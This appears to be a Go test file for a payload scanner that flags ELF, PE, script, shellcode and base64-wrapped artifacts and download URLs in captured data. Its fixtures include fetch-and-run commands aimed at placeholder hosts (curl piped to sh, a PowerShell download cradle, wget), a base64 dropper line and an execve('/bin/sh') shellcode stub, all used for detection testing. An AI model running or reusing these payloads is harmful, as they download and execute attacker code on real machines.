package payload

import (
	"bytes"
	"encoding/base64"
	"strings"
	"testing"
)

func TestScanELF(t *testing.T) {
	data := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, bytes.Repeat([]byte{0}, 64)...)
	f := Scan(data, true)
	if len(f.Artifacts) != 1 || f.Artifacts[0].Kind != KindELF {
		t.Fatalf("expected one ELF artifact; got %+v", f.Artifacts)
	}
	if !hasMarker(f.Markers, "payload-elf") || !hasMarker(f.Markers, "malware-capture") {
		t.Errorf("markers missing: %v", f.Markers)
	}
	if f.Artifacts[0].SHA256 == "" {
		t.Error("artifact missing sha256")
	}
}

func TestScanPEAndScript(t *testing.T) {
	pe := append([]byte("MZ"), bytes.Repeat([]byte{0}, 60)...)
	pe = append(pe, []byte("PE\x00\x00")...)
	if f := Scan(pe, true); len(f.Artifacts) == 0 || f.Artifacts[0].Kind != KindPE {
		t.Errorf("expected PE; got %+v", f.Artifacts)
	}
	sh := []byte("#!/bin/bash\ncurl http://evil/x | sh\n")
	f := Scan(sh, true)
	if len(f.Artifacts) == 0 || f.Artifacts[0].Kind != KindScript {
		t.Errorf("expected script; got %+v", f.Artifacts)
	}
}

func TestScanShellcodeNOPSled(t *testing.T) {
	sc := append(bytes.Repeat([]byte{0x90}, 32), 0x31, 0xc0, 0xcd, 0x80)
	if f := Scan(sc, true); len(f.Artifacts) == 0 || f.Artifacts[0].Kind != KindShellcode {
		t.Errorf("expected shellcode (NOP sled); got %+v", f.Artifacts)
	}
}

func TestScanShellcodeOpcodes(t *testing.T) {
	// execve("/bin/sh") stub — carries 3 distinct opcode sigs (xor eax,
	// push "//sh", int 0x80). Padded with high bytes to clear the >=32
	// length + >=0.45 non-printable thresholds the tightened heuristic
	// requires (so benign binary protocol frames don't false-trigger).
	stub := []byte{0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80}
	sc := append(stub, bytes.Repeat([]byte{0xff}, 16)...)
	if f := Scan(sc, true); !hasMarker(f.Markers, "payload-shellcode") {
		t.Errorf("expected shellcode opcode heuristic; got %v", f.Markers)
	}
}

func TestScanBinaryProtocolNoFalsePositive(t *testing.T) {
	// A binary frame with only 2 incidental opcode sigs must NOT be
	// flagged (the heuristic requires >=3).
	frame := append([]byte{0x31, 0xc0, 0xcd, 0x80}, bytes.Repeat([]byte{0xab, 0xcd, 0xef, 0x12}, 12)...)
	if f := Scan(frame, true); hasMarker(f.Markers, "payload-shellcode") {
		t.Errorf("binary frame with 2 sigs should not be flagged shellcode: %v", f.Markers)
	}
}

func TestScanBase64WrappedELF(t *testing.T) {
	elf := append([]byte{0x7f, 'E', 'L', 'F'}, bytes.Repeat([]byte{0x41}, 80)...)
	b64 := base64.StdEncoding.EncodeToString(elf)
	cmd := []byte("echo " + b64 + " | base64 -d > /tmp/x; chmod +x /tmp/x")
	f := Scan(cmd, true)
	if !hasMarker(f.Markers, "payload-base64-wrapped") {
		t.Errorf("expected base64-wrapped marker; got %v", f.Markers)
	}
	foundELF := false
	for _, a := range f.Artifacts {
		if a.Kind == KindELF {
			foundELF = true
		}
	}
	if !foundELF {
		t.Errorf("expected decoded ELF artifact; got %+v", f.Artifacts)
	}
}

func TestScanHarvestURLs(t *testing.T) {
	cmd := []byte(`powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1'); wget https://x.io/m.elf`)
	f := Scan(cmd, true)
	if len(f.URLs) < 2 {
		t.Errorf("expected 2 URLs; got %v", f.URLs)
	}
	if !hasMarker(f.Markers, "payload-ingress-url") {
		t.Errorf("expected ingress-url marker; got %v", f.Markers)
	}
	for _, u := range f.URLs {
		if strings.ContainsAny(u, " '\"") {
			t.Errorf("URL not trimmed at terminator: %q", u)
		}
	}
}

func TestScanBenignNoMatch(t *testing.T) {
	req := []byte("GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n\r\n")
	if f := Scan(req, true); !f.Empty() {
		t.Errorf("benign HTTP request flagged: %+v", f)
	}
}

func hasMarker(list []string, want string) bool {
	for _, m := range list {
		if m == want {
			return true
		}
	}
	return false
}
